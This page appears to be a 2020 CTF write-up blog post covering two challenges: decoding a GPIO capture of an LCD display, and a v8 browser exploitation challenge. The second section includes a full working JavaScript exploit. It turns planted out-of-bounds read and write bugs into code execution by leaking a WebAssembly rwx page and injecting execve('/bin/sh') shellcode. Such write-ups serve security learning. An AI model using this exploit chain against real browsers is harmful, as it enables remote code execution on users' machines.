@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="https://tcode2k16.github.io/blog/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="CONFidence CTF 2020 Writeup"/>
+  <meta name="twitter:description" content="My solves for CONFidence CTF 2020 challenges"/>
+  
+    <meta name="twitter:site" content="@tcode2k16"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Alan Chang"/>
+  
+
+
+
+		
+		<meta name="author" content="Alan Chang">
+		<meta name="description" content="a random blog about cybersecurity and programming">
+		<meta name="generator" content="Hugo 0.58.3" />
+		<title>CONFidence CTF 2020 Writeup &middot; Alan&#39;s Blog</title>
+		<link rel="shortcut icon" href="https://tcode2k16.github.io/blog/images/favicon.ico">
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/style.css">
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/font-awesome.min.css">
+		
+
+		
+		<link href="https://tcode2k16.github.io/blog/index.xml" rel="alternate" type="application/rss+xml" title="Alan&#39;s Blog" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://tcode2k16.github.io/blog/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://tcode2k16.github.io/blog/posts'>Archive</a>
+	<a href='https://tcode2k16.github.io/blog/tags'>Tags</a>
+	<a href='https://tcode2k16.github.io/blog/about'>About</a>
+
+	
+
+	
+	<a class="cta" href="https://tcode2k16.github.io/blog/index.xml">Subscribe</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        CONFidence CTF 2020 Writeup
+                    </h1>
+                    <h2 class="headline">
+                    Mar 15, 2020 21:33
+                    · 2200 words
+                    · 11 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/ctf">ctf</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/cyber-security">cyber-security</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/write-up">write-up</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/chrome">chrome</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/v8">v8</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/pwn">pwn</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/hardware">hardware</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li><a href="#gpio-tap">GPIO Tap</a>
+<ul>
+<li><a href="#problem">Problem</a></li>
+<li><a href="#solution">Solution</a></li>
+</ul></li>
+<li><a href="#chromatic-aberration">Chromatic Aberration</a>
+<ul>
+<li><a href="#problem-1">Problem</a></li>
+<li><a href="#solution-1">Solution</a>
+<ul>
+<li><a href="#identifying-the-bugs">Identifying the bugs</a></li>
+<li><a href="#from-oob-rw-to-rce">From OOB RW to RCE</a>
+<ul>
+<li><a href="#memory-leaking-with-oob-read">Memory leaking with OOB read</a></li>
+<li><a href="#leveling-up-oob-write-to-arbitrary-write">Leveling up OOB write to arbitrary write</a></li>
+<li><a href="#shellcode-and-profit">Shellcode and profit!</a></li>
+</ul></li>
+<li><a href="#final-exploit">Final exploit</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    
+
+<h1 id="gpio-tap">GPIO Tap</h1>
+
+<h2 id="problem">Problem</h2>
+
+<p>We managed to intercept some traffic on the GPIOs, can you find out what was transmitted?</p>
+
+<p><a href="/blog/2020-03-15-confidence-ctf/GPIO_Tap/c247763a9af9c6cd281b54b61c07957b800cfa1a8b9102eee95b2887b3626f36_gpio_tap.tar">c247763a9af9c6cd281b54b61c07957b800cfa1a8b9102eee95b2887b3626f36_gpio_tap.tar</a> 332K</p>
+
+<h2 id="solution">Solution</h2>
+
+<figure>
+    <img src="/blog/2020-03-15-confidence-ctf/GPIO_Tap/display.jpg"/> 
+</figure>
+
+
+<p>From the given image, we can deduce two important information:</p>
+
+<ol>
+<li>A <a href="https://en.wikipedia.org/wiki/Hitachi_HD44780_LCD_controller">HD44780 LCD display</a> and a raspberry pi are used.</li>
+<li>The pin semantics are as the following:
+
+<ul>
+<li>GPIO 23 → D4</li>
+<li>GPIO 17 → D5</li>
+<li>GPIO 18 → D6</li>
+<li>GPIO 22 → D7</li>
+<li>GPIO 24 → ENABLE</li>
+<li>GPIO 25 → RS</li>
+</ul></li>
+</ol>
+
+<p>We can use this knowledge along with the <a href="https://github.com/arduino-libraries/LiquidCrystal/blob/master/src/LiquidCrystal.cpp">source code</a> from the LiquidCrystal library to parse the <code>tap.gpio</code> file:</p>
+
+<pre><code class="language-python">with open('./tap.gpio') as f:
+  data = f.read().strip()
+
+data = data.replace('25', 'RS').replace('24', 'ENABLE').replace('23', 'D4').replace('17', 'D5').replace('18', 'D6').replace('22', 'D7')
+
+print data
+
+data = data.split('\n')[1:]
+
+def read8bits(data, counter):
+  output = 0
+  for i in [2,1,0,3,9,8,7,10]:
+    line = data[counter+i]
+
+    if 'D' not in line:
+      print 'error on line {}: {}'.format(counter+i, line)
+      exit(-1)
+
+    output += 1 if line.split(' -&gt; ')[-1] == 'HIGH' else 0
+    output = output &lt;&lt; 1
+  for i in [4,5,6,11,12,13]:
+    line = data[counter+i]
+    if 'ENABLE' not in line:
+      print 'error on line {}: {}'.format(counter+i, line)
+      exit(-1)
+
+  return output &gt;&gt; 1
+
+
+counter = 0
+while counter &lt; len(data):
+  line = data[counter]
+  if 'RS' in line:
+    msg_type = 'COMMAND' if line.split(' -&gt; ')[-1] == 'LOW' else 'WRITE'
+    output = read8bits(data, counter+1)
+    meaning = ''
+    if msg_type == 'COMMAND' and output &amp; 0x80 != 0:
+      meaning += 'LCD_SETDDRAMADDR'+' {}'.format(output^0x80)
+    elif msg_type == 'COMMAND' and output &amp; 0x40 != 0:
+      meaning += 'LCD_SETCGRAMADDR'
+    elif msg_type == 'COMMAND' and output &amp; 0x20 != 0:
+      meaning += 'LCD_FUNCTIONSET'
+    elif msg_type == 'WRITE':
+      meaning += chr(output)
+    print '{:10s}: {} ({})'.format(msg_type,hex(output),meaning)
+    counter += 15
+  else:
+    print 'error on line {}: {}'.format(counter, line)
+</code></pre>
+
+<pre><code>$ python main.py
+...
+COMMAND   : 0x33 (LCD_FUNCTIONSET)
+COMMAND   : 0x32 (LCD_FUNCTIONSET)
+COMMAND   : 0xc ()
+COMMAND   : 0x28 (LCD_FUNCTIONSET)
+COMMAND   : 0x6 ()
+COMMAND   : 0x1 ()
+COMMAND   : 0xc ()
+WRITE     : 0x57 (W)
+WRITE     : 0x65 (e)
+WRITE     : 0x6c (l)
+WRITE     : 0x63 (c)
+WRITE     : 0x6f (o)
+WRITE     : 0x6d (m)
+WRITE     : 0x65 (e)
+WRITE     : 0x20 ( )
+WRITE     : 0x74 (t)
+WRITE     : 0x6f (o)
+WRITE     : 0x20 ( )
+WRITE     : 0x70 (p)
+WRITE     : 0x34 (4)
+WRITE     : 0x63 (c)
+WRITE     : 0x74 (t)
+WRITE     : 0x66 (f)
+WRITE     : 0x20 ( )
+WRITE     : 0x3a (:)
+WRITE     : 0x29 ())
+WRITE     : 0x20 ( )
+WRITE     : 0x21 (!)
+WRITE     : 0x21 (!)
+COMMAND   : 0x18 ()
+COMMAND   : 0x18 ()
+COMMAND   : 0x18 ()
+COMMAND   : 0x18 ()
+COMMAND   : 0x18 ()
+COMMAND   : 0x18 ()
+COMMAND   : 0x18 ()
+COMMAND   : 0x18 ()
+COMMAND   : 0x18 ()
+COMMAND   : 0x18 ()
+COMMAND   : 0x1 ()
+COMMAND   : 0xc0 (LCD_SETDDRAMADDR 64)
+WRITE     : 0x75 (u)
+COMMAND   : 0x81 (LCD_SETDDRAMADDR 1)
+WRITE     : 0x34 (4)
+COMMAND   : 0x86 (LCD_SETDDRAMADDR 6)
+WRITE     : 0x4f (O)
+COMMAND   : 0x85 (LCD_SETDDRAMADDR 5)
+WRITE     : 0x49 (I)
+COMMAND   : 0xc2 (LCD_SETDDRAMADDR 66)
+WRITE     : 0x7d (})
+COMMAND   : 0x8e (LCD_SETDDRAMADDR 14)
+WRITE     : 0x72 (r)
+COMMAND   : 0xc1 (LCD_SETDDRAMADDR 65)
+WRITE     : 0x70 (p)
+COMMAND   : 0x82 (LCD_SETDDRAMADDR 2)
+WRITE     : 0x7b ({)
+COMMAND   : 0x87 (LCD_SETDDRAMADDR 7)
+WRITE     : 0x5f (_)
+COMMAND   : 0x88 (LCD_SETDDRAMADDR 8)
+WRITE     : 0x74 (t)
+COMMAND   : 0x80 (LCD_SETDDRAMADDR 0)
+WRITE     : 0x70 (p)
+COMMAND   : 0x89 (LCD_SETDDRAMADDR 9)
+WRITE     : 0x34 (4)
+COMMAND   : 0x83 (LCD_SETDDRAMADDR 3)
+WRITE     : 0x47 (G)
+COMMAND   : 0x8b (LCD_SETDDRAMADDR 11)
+WRITE     : 0x5f (_)
+COMMAND   : 0x8f (LCD_SETDDRAMADDR 15)
+WRITE     : 0x6d (m)
+COMMAND   : 0x84 (LCD_SETDDRAMADDR 4)
+WRITE     : 0x50 (P)
+COMMAND   : 0x8a (LCD_SETDDRAMADDR 10)
+WRITE     : 0x70 (p)
+COMMAND   : 0x8c (LCD_SETDDRAMADDR 12)
+WRITE     : 0x77 (w)
+COMMAND   : 0x8d (LCD_SETDDRAMADDR 13)
+WRITE     : 0x61 (a)
+</code></pre>
+
+<p>We can see not all characters are displayed in sequential order. Instead, the <code>LCD_SETDDRAMADDR</code> command is used to determine the location of each symbol. After some sorting, we are able to retrieve the flag:</p>
+
+<pre><code>COMMAND   : 0x80 (LCD_SETDDRAMADDR 0)
+WRITE     : 0x70 (p)
+COMMAND   : 0x81 (LCD_SETDDRAMADDR 1)
+WRITE     : 0x34 (4)
+COMMAND   : 0x82 (LCD_SETDDRAMADDR 2)
+WRITE     : 0x7b ({)
+COMMAND   : 0x83 (LCD_SETDDRAMADDR 3)
+WRITE     : 0x47 (G)
+COMMAND   : 0x84 (LCD_SETDDRAMADDR 4)
+WRITE     : 0x50 (P)
+COMMAND   : 0x85 (LCD_SETDDRAMADDR 5)
+WRITE     : 0x49 (I)
+COMMAND   : 0x86 (LCD_SETDDRAMADDR 6)
+WRITE     : 0x4f (O)
+COMMAND   : 0x87 (LCD_SETDDRAMADDR 7)
+WRITE     : 0x5f (_)
+COMMAND   : 0x88 (LCD_SETDDRAMADDR 8)
+WRITE     : 0x74 (t)
+COMMAND   : 0x89 (LCD_SETDDRAMADDR 9)
+WRITE     : 0x34 (4)
+COMMAND   : 0x8a (LCD_SETDDRAMADDR 10)
+WRITE     : 0x70 (p)
+COMMAND   : 0x8b (LCD_SETDDRAMADDR 11)
+WRITE     : 0x5f (_)
+COMMAND   : 0x8c (LCD_SETDDRAMADDR 12)
+WRITE     : 0x77 (w)
+COMMAND   : 0x8d (LCD_SETDDRAMADDR 13)
+WRITE     : 0x61 (a)
+COMMAND   : 0x8e (LCD_SETDDRAMADDR 14)
+WRITE     : 0x72 (r)
+COMMAND   : 0x8f (LCD_SETDDRAMADDR 15)
+WRITE     : 0x6d (m)
+COMMAND   : 0xc0 (LCD_SETDDRAMADDR 64)
+WRITE     : 0x75 (u)
+COMMAND   : 0xc1 (LCD_SETDDRAMADDR 65)
+WRITE     : 0x70 (p)
+COMMAND   : 0xc2 (LCD_SETDDRAMADDR 66)
+WRITE     : 0x7d (})
+</code></pre>
+
+<p>flag: <code>p4{GPIO_t4p_warmup}</code></p>
+
+<h1 id="chromatic-aberration">Chromatic Aberration</h1>
+
+<h2 id="problem-1">Problem</h2>
+
+<p>Pwn our chrome for fun and profit.</p>
+
+<p>Ok, it&rsquo;s not really Chrome, but it&rsquo;s close enough.</p>
+
+<p>Let&rsquo;s say, it&rsquo;s chromatic</p>
+
+<p>The memory limit is 64MB</p>
+
+<p><code>nc chromatic-aberration.zajebistyc.tf 31004</code></p>
+
+<h2 id="solution-1">Solution</h2>
+
+<p>This is the first browser pwn challenge that I solved, and I learned a lot from this experience. I relied on both past writeups and the <strong>v8</strong> source code to solve the challenge. Here are just a few resources that helped me out during the process:</p>
+
+<ul>
+<li><a href="https://github.com/m1ghtym0/browser-pwn#chromium-pwn">m1ghtym0/browser-pwn</a></li>
+<li><a href="https://syedfarazabrar.com/2019-12-13-starctf-oob-v8-indepth/">Exploiting v8: *CTF 2019 oob-v8</a></li>
+<li><a href="https://changochen.github.io/2019-04-29-starctf-2019.html">*CTF 2019 oob-v8</a></li>
+</ul>
+
+<h3 id="identifying-the-bugs">Identifying the bugs</h3>
+
+<p>Looking at the <code>diff.diff</code> file, we can see two bugs being introduced into the v8 javascript engine.</p>
+
+<p>The first bug is an out-of-bound read from any string objects:</p>
+
+<pre><code>$ ./bin/d8
+V8 version 8.1.307.20
+d8&gt; var a = new String();
+undefined
+d8&gt; a.charCodeAt(1000);
+116
+</code></pre>
+
+<p>The second bug is an out-of-bound write in the <code>fill</code> method of a TypedArray:</p>
+
+<pre><code>d8&gt; var b = new Uint8Array([0]);
+undefined
+d8&gt; b.fill(0xff, 1000,1001);
+0
+</code></pre>
+
+<h3 id="from-oob-rw-to-rce">From OOB RW to RCE</h3>
+
+<p>From previous readings, I learned that for every WebAssembly instance, v8 will allocate a <code>rwx</code> memory region. With an arbitrary write, we can inject shellcode to this region and execute it using the WebAssembly instance.</p>
+
+<p>With this in mind, our plan becomes:</p>
+
+<ol>
+<li>leak the memory address of the <code>rwx</code> region</li>
+<li>obtain an arbitrary write to load our shellcode</li>
+<li>execute the shellcode</li>
+</ol>
+
+<h4 id="memory-leaking-with-oob-read">Memory leaking with OOB read</h4>
+
+<p>Utilizing the OOB read that we have, we can leak any value on the heap given its offset.</p>
+
+<p><code>d8</code> has this useful flag <code>--allow-natives-syntax</code> which allows us to use the <code>%DebugPrint</code> function to inspect javascript objects and get their addresses in memory. Pairing this with <code>gdb</code>, we can find the offsets between objects with relative ease.</p>
+
+<blockquote>
+<p>One thing to note is that v8 uses the last bit of each value to indicate if it is a pointer, so always do <code>ptr-1</code> when viewing object memory in <code>gdb</code>.</p>
+</blockquote>
+
+<p>From previous writeups, we know that the address of the <code>rwx</code> region is referenced at <code>wasm_instance_addr+0x68</code>; therefore, if we obtain the offset between the string object and the wasm instance, we can combine the two and leak the address of the <code>rwx</code> region:</p>
+
+<pre><code>d8&gt; const wasm_code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x00, 0x0b]);
+d8&gt; var a = new String('helloworld');
+d8&gt; const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));
+d8&gt; %DebugPrint(a)
+DebugPrint: 0x379b08084075: [JSPrimitiveWrapper]
+ ...
+ - value: 0x379b0820f501 &lt;String[#10]: helloworld&gt;  ← the string pointer points to this address +12
+...
+helloworld
+d8&gt; %DebugPrint(wasm_instance)
+DebugPrint: 0x379b0820f829: [WasmInstanceObject] in OldSpace
+...
+[object WebAssembly.Instance]
+d8&gt; ^C
+...
+gef➤  der 0x379b0820f829-1                          ← wasm_instance
+0x0000379b0820f828│+0x0000: 0x080406e908243169
+...
+0x0000379b0820f890│+0x0068: 0x00002a4e747c7000      ← rwx region address that we are looking for
+</code></pre>
+
+<p>In this case, the offset between the string object and the <code>rwx</code> region address is <code>(0x379b0820f829-1+0x68)-(0x379b0820f501-1+12) == 900</code>. With this, we get the code below:</p>
+
+<pre><code class="language-javascript">var m1 = 0, m2 = 0, offset=0;
+for (let j = -256; j &lt; 256; j+=4) {
+  m1 = 0, m2 = 0;
+  for (let i = 0; i &lt; 4; i++) {
+    m1 += a.charCodeAt(GENERAL_OFFSET+j+i) &lt;&lt; (8*i);
+  }
+  for (let i = 0; i &lt; 4; i++) {
+    m2 += a.charCodeAt(GENERAL_OFFSET+j+4+i) &lt;&lt; (8*i);
+  }
+  if (m2 !== 0 &amp;&amp; m1 !== 0 &amp;&amp; (m1&amp;0xfff) === 0 &amp;&amp; (m1&amp;0x1000) === 0x1000) {
+    offset = 3896+j;
+    console.log('found: '+offset);
+    break;
+  }
+}
+let rwx_addr = [m2,m1];
+console.log('rwx_addr: '+hex(...rwx_addr));
+</code></pre>
+
+<blockquote>
+<p>I included an extra loop to search for the correct address around the general_offset becuase the offset varies a bit between executions.</p>
+</blockquote>
+
+<h4 id="leveling-up-oob-write-to-arbitrary-write">Leveling up OOB write to arbitrary write</h4>
+
+<p>Now with the <code>rwx</code> region address in hand, we need a way to write to it.</p>
+
+<p>From previous writeups, the solution seems to be using an <code>ArrayBuffer</code> plus <code>DataView</code>; however, I can&rsquo;t get it to work likely due to changes in the v8 engine.</p>
+
+<p>In the end, I used a <code>TypedArray</code>. By modifying its <code>external_pointer</code>, I am able to achieve an arbitrary write. I found this method by reading the v8 source code:</p>
+
+<pre><code class="language-c++">// https://github.com/v8/v8/blob/4b9b23521e6fd42373ebbcb20ebe03bf445494f9/src/elements.cc
+static Object FillImpl(Handle&lt;JSObject&gt; receiver, Handle&lt;Object&gt; obj_value,
+                       uint32_t start, uint32_t end) {
+  Handle&lt;JSTypedArray&gt; array = Handle&lt;JSTypedArray&gt;::cast(receiver);
+  DCHECK(!array-&gt;WasDetached());
+  DCHECK(obj_value-&gt;IsNumeric());
+
+  ctype value = BackingStore::FromHandle(obj_value);
+
+  // Ensure indexes are within array bounds
+  CHECK_LE(0, start);
+  CHECK_LE(start, end);
+  CHECK_LE(end, array-&gt;length_value());
+
+  DisallowHeapAllocation no_gc;
+  BackingStore elements = BackingStore::cast(receiver-&gt;elements());
+  ctype* data = static_cast&lt;ctype*&gt;(elements-&gt;DataPtr()); // ← the location to fill is determined by DataPtr
+  std::fill(data + start, data + end, value);
+  return *array;
+}
+
+// https://github.com/v8/v8/blob/4b9b23521e6fd42373ebbcb20ebe03bf445494f9/src/objects/fixed-array-inl.h
+void* FixedTypedArrayBase::DataPtr() {
+  return reinterpret_cast&lt;void*&gt;(
+      base_pointer()-&gt;ptr() + reinterpret_cast&lt;intptr_t&gt;(external_pointer())); // ← DataPtr = base_pointer + external_pointer
+}
+</code></pre>
+
+<p>In the code below, I allocated two TypedArrays next to each other. I used the OOB write from the first one to change the <code>external_pointer</code> of the second one. After the modification, <code>buffer</code> will be able to write to the <code>rwx</code> region.</p>
+
+<blockquote>
+<p>Offsets used here are found using the same method as above (<code>%DebugPrint</code> + <code>gdb</code>)</p>
+</blockquote>
+
+<pre><code class="language-javascript">var d = new Uint8Array([0]);
+var buffer = new Uint8Array([0]);
+
+let other = (BigInt(rwx_addr[0])&lt;&lt;32n)+BigInt(rwx_addr[1])-0x80804edn;
+other = [Number(other &gt;&gt; 32n), Number(other &amp; 0xffffffffn)];
+
+
+[m1, m2] = other;
+for (let i = 0; i &lt; 4; i++) {
+  d.fill(m1&amp;0xff, 164+0x28+4+i, 164+0x28+4+i+1);
+  m1 &gt;&gt;= 8;
+}
+for (let i = 0; i &lt; 4; i++) {
+  d.fill(m2&amp;0xff, 164+0x28+i, 164+0x28+i+1);
+  m2 &gt;&gt;= 8;
+}
+</code></pre>
+
+<h4 id="shellcode-and-profit">Shellcode and profit!</h4>
+
+<p>Lastly, we use the arbitrary write to inject shellcode into the <code>rwx</code> region and trigger it with the wasm_instance. It looks something like this in code:</p>
+
+<pre><code class="language-javascript">var shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5, 144, 144, 144, 144];
+for (let i = 0; i &lt; shellcode.length; i++) {
+  buffer.fill(shellcode[i], i, i+1);
+}
+
+wasm_func();
+</code></pre>
+
+<h3 id="final-exploit">Final exploit</h3>
+
+<p>Here is the full exploit script:</p>
+
+<pre><code class="language-javascript">let array_buf = new ArrayBuffer(8);
+let buf_view = new DataView(array_buf);
+
+function f2i(f) {
+  buf_view.setFloat64(0, f);
+  return [buf_view.getUint32(0), buf_view.getUint32(4)];
+}
+
+function i2f(a, b) {
+  buf_view.setUint32(0, a);
+  buf_view.setUint32(4, b);
+  
+  return buf_view.getFloat64(0);
+}
+
+function gc() {
+  for (let i = 0; i &lt; 0x10; i++) { new ArrayBuffer(0x1000000); }
+}
+
+
+function hex(a, b) {
+  a = '00000000'+a.toString(16);
+  b = '00000000'+b.toString(16);
+  a = a.substring(a.length-8,a.length);
+  b = b.substring(b.length-8,b.length);
+  return '0x'+a+b;
+}
+
+gc();
+
+const wasm_code = new Uint8Array([
+  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+  0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
+  0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
+  0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,
+  0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,
+  0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,
+  0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,
+  0x00, 0x00, 0x41, 0x00, 0x0b
+]);
+var a = new String('helloworld');
+const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));
+
+const wasm_func = wasm_instance.exports.a;
+
+var d = new Uint8Array([0]);
+var buffer = new Uint8Array([0]);
+
+
+var m1 = 0, m2 = 0, offset=0;
+for (let j = -256; j &lt; 256; j+=4) {
+  m1 = 0, m2 = 0;
+  for (let i = 0; i &lt; 4; i++) {
+    m1 += a.charCodeAt(3340+j+i) &lt;&lt; (8*i);
+  }
+  for (let i = 0; i &lt; 4; i++) {
+    m2 += a.charCodeAt(3340+j+4+i) &lt;&lt; (8*i);
+  }
+  if (m2 !== 0 &amp;&amp; m1 !== 0 &amp;&amp; (m1&amp;0xfff) === 0 &amp;&amp; (m1&amp;0x1000) === 0x1000) {
+    offset = 3896+j;
+    console.log('found: '+offset);
+    break;
+  }
+}
+
+
+let rwx_addr = [m2,m1];
+console.log('rwx_addr: '+hex(...rwx_addr));
+
+let other = (BigInt(rwx_addr[0])&lt;&lt;32n)+BigInt(rwx_addr[1])-0x80804edn;
+other = [Number(other &gt;&gt; 32n), Number(other &amp; 0xffffffffn)];
+
+
+[m1, m2] = other;
+for (let i = 0; i &lt; 4; i++) {
+  d.fill(m1&amp;0xff, 164+0x28+4+i, 164+0x28+4+i+1);
+  m1 &gt;&gt;= 8;
+}
+for (let i = 0; i &lt; 4; i++) {
+  d.fill(m2&amp;0xff, 164+0x28+i, 164+0x28+i+1);
+  m2 &gt;&gt;= 8;
+}
+
+var shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5, 144, 144, 144, 144];
+for (let i = 0; i &lt; shellcode.length; i++) {
+  buffer.fill(shellcode[i], i, i+1);
+}
+
+wasm_func();
+</code></pre>
+
+<p>flag: <code>p4{c0mPIling_chr@mium_1s_h4rd_ok?}</code></p>
+
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=https%3a%2f%2ftcode2k16.github.io%2fblog%2fposts%2f2020-03-15-confidence-ctf%2f - CONFidence%20CTF%202020%20Writeup by @tcode2k16"><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'github-blog-14'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+        <div id="social">
+
+	
+	
+    <a class="symbol" href="https://www.github.com/tcode2k16">
+        <i class="fa fa-github-square"></i>
+    </a>
+    
+    <a class="symbol" href="https://twitter.com/tcode2k16">
+        <i class="fa fa-twitter-square"></i>
+    </a>
+    
+
+
+</div>
+
+    
+    <p class="small">
+    
+       © Copyright 2020 <i class="fa fa-heart" aria-hidden="true"></i> Alan Chang
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://tcode2k16.github.io/blog/js/jquery-3.3.1.min.js"></script>
+<script src="https://tcode2k16.github.io/blog/js/main.js"></script>
+<script src="https://tcode2k16.github.io/blog/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-88069322-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
